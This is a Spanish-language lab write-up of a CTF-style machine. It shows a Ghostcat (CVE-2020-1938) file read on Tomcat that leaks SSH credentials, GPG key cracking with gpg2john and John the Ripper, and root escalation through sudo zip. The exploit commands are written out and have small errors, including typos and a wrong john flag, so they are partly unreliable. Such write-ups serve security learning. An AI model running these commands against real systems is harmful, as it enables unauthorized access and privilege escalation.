----------
- Tags:  #writeup #info #vulnhub #tutorial #cracking
-----------

# Explotacion

- ## Puertos Abiertos: 22, 8080, 8009

La maquina corre una version vulnerable de  [[Tomcat]] 9.0.30. Esta version es vulnerable al exploit *CVE-2020-1938*
- [Github Repo](https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md)

Una vez ejecutamos el exploit de la siguiente forma:
```python2
python2 CVE-2020-1938 <IpVictima> -p 8009 -f WEB-INF/web.xml
```

## Esta vulnerabilidad nos muestra un archivo XML el cual contiene las credenciales [[SSH]] validas del [[Tomcat]]

----------------------

# Privesc

Dentro de la maquina encontramos 2 archivos, uno con extension *.gpg* el cual no podemos abrir. Por otro lado tenemos otro con extension *.asc* el cual es el archivo clave para poder entrar a el primer archivo, el *.gpg* .

Lo que hacemos es transferirnos estos archivos a nuestra maquina local para poder trabajar mas comodamente. 
El archivo clave *.asc* lo crackearemos con *jhon*, pero usaremos el siguiente comando:
```bash
gpg2john tryhackme.asc > hash
```

Esto guarda el contenido en el archivo *hash*, el cual ahora si le podemos pasar como parametro a *john the ripper* como lo hacemos normalmente:

```bash
john -W <rockrou.txt> hash
```

una vez crackeada la clave del hash, regresamos a la maquina, para *importar* el archivo clave, el  *.asc*, de la siguiente forma:
```bash
gpg --import tryhackme.asc
```

Y por ultimo ahora si abrimos el archivo *.gpg*:
```bash
gpg --decrypt credentials.pgp
```

Digitamos la contraseña que crackeamos. Ahora este archivo contiene las credenciales del *2do Usuario* (Merlin)
- En este usuario tenemos permiso de ejecutar el */usr/bin/zip* como Root sin proporcionar contraseña. 
```bash
TF =$(mktemp -u)
//
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

- [GTFOBins Zip](https://gtfobins.github.io/gtfobins/zip/)







